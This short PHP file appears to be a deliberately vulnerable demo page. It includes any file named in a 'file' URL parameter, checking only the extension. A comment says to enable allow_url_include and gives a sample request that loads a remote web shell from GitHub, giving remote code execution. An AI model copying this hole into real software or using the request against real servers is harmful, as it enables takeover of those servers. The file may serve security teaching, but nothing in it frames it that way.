<?php
/*
TODO change php configuration (php.ini)
/etc/php/version/cli/php.ini
; Whether to allow include/require to open URLs (like http:// or ftp://) as fil$
; http://php.net/allow-url-include
allow_url_include = On

/explore.php?file=https://raw.githubusercontent.com/Arrexel/phpbash/master/phpbash.php

*/
if (isset($_GET['file'])) {
  if (in_array(explode(".", $_GET['file'])[count(explode(".", $_GET['file']))-1], ['php', 'html'])) {
    include($_GET['file']);
  } else {
    die('extension not allowed');
  }
} else {
  die('missing get parameter "file"');
}
?>
